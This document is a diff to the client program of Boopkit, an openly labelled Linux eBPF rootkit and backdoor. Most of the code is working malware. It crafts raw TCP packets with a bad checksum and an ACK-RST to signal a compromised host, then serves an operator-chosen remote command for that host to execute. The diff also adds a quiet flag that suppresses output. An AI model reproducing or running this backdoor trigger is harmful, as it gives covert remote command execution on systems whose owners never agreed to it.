@@ -32,37 +32,27 @@
 
 // clang-format off
 #include "../boopkit.h"
+#include "../common.h"
 #include "tcp.h"
 // clang-format on
 
-// asciiheader is the main runtime banner.
-void asciiheader() {
-  printf("\n\n");
-  printf("   ██████╗  ██████╗  ██████╗ ██████╗ ██╗  ██╗██╗████████╗\n");
-  printf("   ██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗██║ ██╔╝██║╚══██╔══╝\n");
-  printf("   ██████╔╝██║   ██║██║   ██║██████╔╝█████╔╝ ██║   ██║   \n");
-  printf("   ██╔══██╗██║   ██║██║   ██║██╔═══╝ ██╔═██╗ ██║   ██║   \n");
-  printf("   ██████╔╝╚██████╔╝╚██████╔╝██║     ██║  ██╗██║   ██║   \n");
-  printf("   ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝   ╚═╝   \n");
-  printf("\n\n");
-}
-
 void usage() {
-  printf("Boopkit version: %s\n", VERSION);
-  printf("Linux rootkit and backdoor over eBPF.\n");
-  printf("Author: Kris Nóva <kris@nivenly.com>\n");
-  printf("\n");
-  printf("Usage: \n");
-  printf("boopkit-boop [options]\n");
-  printf("\n");
-  printf("Options:\n");
-  printf("-lhost             Local  (src) address   : 127.0.0.1.\n");
-  printf("-lport             Local  (src) port      :    3535\n");
-  printf("-rhost             Remote (dst) address   : 127.0.0.1.\n");
-  printf("-rport             Remote (dst) port      : 22\n");
-  printf("-x, execute        Remote command to exec : ls -la\n");
-  printf("-h, help           Print help and usage.\n");
-  printf("\n");
+  boopprintf("Boopkit version: %s\n", VERSION);
+  boopprintf("Linux rootkit and backdoor over eBPF.\n");
+  boopprintf("Author: Kris Nóva <kris@nivenly.com>\n");
+  boopprintf("\n");
+  boopprintf("Usage: \n");
+  boopprintf("boopkit-boop [options]\n");
+  boopprintf("\n");
+  boopprintf("Options:\n");
+  boopprintf("-lhost             Local  (src) address   : 127.0.0.1.\n");
+  boopprintf("-lport             Local  (src) port      :    3535\n");
+  boopprintf("-rhost             Remote (dst) address   : 127.0.0.1.\n");
+  boopprintf("-rport             Remote (dst) port      : 22\n");
+  boopprintf("-q, quiet          Disable output.\n");
+  boopprintf("-x, execute        Remote command to exec : ls -la\n");
+  boopprintf("-h, help           Print help and usage.\n");
+  boopprintf("\n");
   exit(0);
 }
 
@@ -105,6 +95,9 @@ void clisetup(int argc, char **argv) {
         case 'x':
           strncpy(cfg.rce, argv[i + 1], MAX_RCE_SIZE);
           break;
+        case 'q':
+          quiet = 1;
+          break;
       }
     }
   }
@@ -113,8 +106,8 @@ void clisetup(int argc, char **argv) {
 void rootcheck(int argc, char **argv) {
   long luid = (long)getuid();
   if (luid != 0) {
-    printf("  XX Invalid UID.\n");
-    printf("  XX Permission denied.\n");
+    boopprintf("  XX Invalid UID.\n");
+    boopprintf("  XX Permission denied.\n");
     exit(1);
   }
 }
@@ -126,35 +119,35 @@ int serverce(char listenstr[INET_ADDRSTRLEN], char *rce) {
   laddr.sin_family = AF_INET;
   laddr.sin_port = htons(PORT);
   if (inet_pton(AF_INET, listenstr, &laddr.sin_addr) != 1) {
-    printf(" XX Listen IP configuration failed.\n");
+    boopprintf(" XX Listen IP configuration failed.\n");
     return 1;
   }
   int servesock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
   if (servesock == -1) {
-    printf(" XX Socket creation failed\n");
+    boopprintf(" XX Socket creation failed\n");
     return 1;
   }
   if (setsockopt(servesock, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, oneval,
                  sizeof oneval)) {
-    printf(" XX Socket option SO_REUSEADDR | SO_REUSEPORT failed\n");
+    boopprintf(" XX Socket option SO_REUSEADDR | SO_REUSEPORT failed\n");
     return 1;
   }
   if (bind(servesock, (struct sockaddr *)&laddr, sizeof laddr) < 0) {
-    printf(" XX Socket bind failure: %s\n", listenstr);
+    boopprintf(" XX Socket bind failure: %s\n", listenstr);
     return 1;
   }
-  printf("LISTEN   [serving exec] <- %s:%s\n", cfg.lhost, cfg.lport);
-  // printf("Listening for Boopkit response...\n");
+  boopprintf("LISTEN   [serving exec] <- %s:%s\n", cfg.lhost, cfg.lport);
+  // boopprintf("Listening for Boopkit response...\n");
   //  n=1 is the number of clients to accept before we begin refusing clients!
   if (listen(servesock, 1) < 0) {
-    printf(" XX Socket listen failure: %s\n", listenstr);
+    boopprintf(" XX Socket listen failure: %s\n", listenstr);
     return 1;
   }
   int clientsock;
   int addrlen = sizeof laddr;
   if ((clientsock = accept(servesock, (struct sockaddr *)&laddr,
                            (socklen_t *)&addrlen)) < 0) {
-    printf(" XX Socket accept failure: %s\n", listenstr);
+    boopprintf(" XX Socket accept failure: %s\n", listenstr);
     return 1;
   }
   send(clientsock, rce, MAX_RCE_SIZE, 0);
@@ -172,17 +165,18 @@ int serverce(char listenstr[INET_ADDRSTRLEN], char *rce) {
 // a boop!
 //
 int main(int argc, char **argv) {
+
   int one = 1;
   const int *oneval = &one;
-  asciiheader();
   clisetup(argc, argv);
+  asciiheader();
   rootcheck(argc, argv);
   srand(time(NULL));
-  printf("RHOST    [%s]\n", cfg.rhost);
-  printf("RPORT    [%s]\n", cfg.rport);
-  printf("LHOST    [%s]\n", cfg.lhost);
-  printf("LPORT    [%s]\n", cfg.lport);
-  printf("RCE EXEC [%s]\n", cfg.rce);
+  boopprintf("RHOST    [%s]\n", cfg.rhost);
+  boopprintf("RPORT    [%s]\n", cfg.rport);
+  boopprintf("LHOST    [%s]\n", cfg.lhost);
+  boopprintf("LPORT    [%s]\n", cfg.lport);
+  boopprintf("RCE EXEC [%s]\n", cfg.rce);
 
   // [Destination]
   // Configure daddr fields sin_port, sin_addr, sin_family
@@ -190,7 +184,7 @@ int main(int argc, char **argv) {
   daddr.sin_family = AF_INET;
   daddr.sin_port = htons(atoi(cfg.rport));
   if (inet_pton(AF_INET, cfg.rhost, &daddr.sin_addr) != 1) {
-    printf("Destination IP configuration failed\n");
+    boopprintf("Destination IP configuration failed\n");
     return 1;
   }
 
@@ -200,7 +194,7 @@ int main(int argc, char **argv) {
   saddr.sin_family = AF_INET;
   saddr.sin_port = htons(rand() % 65535);  // random client port
   if (inet_pton(AF_INET, cfg.lhost, &saddr.sin_addr) != 1) {
-    printf("Source IP configuration failed\n");
+    boopprintf("Source IP configuration failed\n");
     return 1;
   }
 
@@ -226,12 +220,12 @@ int main(int argc, char **argv) {
   // of unfixed length!
   int sock1 = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
   if (sock1 == -1) {
-    printf("Socket SOCK_RAW creation failed\n");
+    boopprintf("Socket SOCK_RAW creation failed\n");
     return 1;
   }
   // [Socket] IP_HDRINCL Header Include
   if (setsockopt(sock1, IPPROTO_IP, IP_HDRINCL, oneval, sizeof(one)) == -1) {
-    printf("Unable to set socket option [IP_HDRINCL]\n");
+    boopprintf("Unable to set socket option [IP_HDRINCL]\n");
     return 1;
   }
   // [SYN] Send a packet with a 0 checksum!
@@ -243,10 +237,10 @@ int main(int argc, char **argv) {
   int sent;
   if ((sent = sendto(sock1, packet, packet_len, 0, (struct sockaddr *)&daddr,
                      sizeof(struct sockaddr))) == -1) {
-    printf("Unable to send bad checksum SYN packet over SOCK_RAW.\n");
+    boopprintf("Unable to send bad checksum SYN packet over SOCK_RAW.\n");
     return 2;
   }
-  printf("SYN      [bad checksum] -> %s:%s %d bytes\n", cfg.rhost, cfg.rport,
+  boopprintf("SYN      [bad checksum] -> %s:%s %d bytes\n", cfg.rhost, cfg.rport,
          sent);
   close(sock1);
   // ===========================================================================
@@ -262,14 +256,14 @@ int main(int argc, char **argv) {
   // [Socket] SOCK_STREAM Sequenced, reliable, connection-based byte streams.
   int sock2 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
   if (sock2 == -1) {
-    printf("Socket creation failed\n");
+    boopprintf("Socket creation failed\n");
     return 1;
   }
   if (connect(sock2, (struct sockaddr *)&daddr, sizeof daddr) < 0) {
-    printf("Connection SOCK_STREAM refused.\n");
+    boopprintf("Connection SOCK_STREAM refused.\n");
     return 2;
   }
-  printf("CONNECT  [    okay    ] -> %s:%s\n", cfg.rhost, cfg.rport);
+  boopprintf("CONNECT  [    okay    ] -> %s:%s\n", cfg.rhost, cfg.rport);
   close(sock2);
   // ===========================================================================
 
@@ -287,29 +281,29 @@ int main(int argc, char **argv) {
   // [Socket] SOCK_STREAM Sequenced, reliable, connection-based byte streams.
   int sock3 = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
   if (sock3 == -1) {
-    printf("Socket SOCK_RAW creation failed\n");
+    boopprintf("Socket SOCK_RAW creation failed\n");
     return 1;
   }
   // [Socket] IP_HDRINCL Header Include
   if (setsockopt(sock3, IPPROTO_IP, IP_HDRINCL, oneval, sizeof(one)) == -1) {
-    printf("Unable to set socket option [IP_HDRINCL]\n");
+    boopprintf("Unable to set socket option [IP_HDRINCL]\n");
     return 1;
   }
   create_syn_packet(&saddr, &daddr, &packet, &packet_len);
   if ((sent = sendto(sock3, packet, packet_len, 0, (struct sockaddr *)&daddr,
                      sizeof(struct sockaddr))) == -1) {
-    printf("Unable to send RST over SOCK_STREAM.\n");
+    boopprintf("Unable to send RST over SOCK_STREAM.\n");
     return 2;
   }
-  printf("SYN      [    okay    ] -> %d bytes to %s:%s\n", sent, cfg.rhost,
+  boopprintf("SYN      [    okay    ] -> %d bytes to %s:%s\n", sent, cfg.rhost,
          cfg.rport);
   char recvbuf[DATAGRAM_LEN];
   int received = receive_from(sock3, recvbuf, sizeof(recvbuf), &saddr);
   if (received <= 0) {
-    printf("Unable to receive SYN-ACK over SOCK_STREAM.\n");
+    boopprintf("Unable to receive SYN-ACK over SOCK_STREAM.\n");
     return 3;
   }
-  printf("SYN-ACK  [    okay    ] <- %d bytes from %s\n", received, cfg.rhost);
+  boopprintf("SYN-ACK  [    okay    ] <- %d bytes from %s\n", received, cfg.rhost);
   uint32_t seq_num, ack_num;
   read_seq_and_ack(recvbuf, &seq_num, &ack_num);
   int new_seq_num = seq_num + 1;
@@ -317,10 +311,10 @@ int main(int argc, char **argv) {
                         &packet_len);
   if ((sent = sendto(sock3, packet, packet_len, 0, (struct sockaddr *)&daddr,
                      sizeof(struct sockaddr))) == -1) {
-    printf("Unable to send ACK-RST over SOCK_STREAM.\n");
+    boopprintf("Unable to send ACK-RST over SOCK_STREAM.\n");
     return 2;
   }
-  printf("ACK-RST  [    okay    ] -> %d bytes to %s:%s\n", sent, cfg.rhost,
+  boopprintf("ACK-RST  [    okay    ] -> %d bytes to %s:%s\n", sent, cfg.rhost,
          cfg.rport);
   close(sock3);
   // ===========================================================================
@@ -328,8 +322,8 @@ int main(int argc, char **argv) {
   int errno;
   errno = serverce(saddrstr, cfg.rce);
   if (errno != 0) {
-    printf(" Error serving RCE!\n");
+    boopprintf(" Error serving RCE!\n");
   }
-  printf("EXEC  -> [%s]\n", cfg.rce);
+  boopprintf("EXEC  -> [%s]\n", cfg.rce);
   return 0;
 }
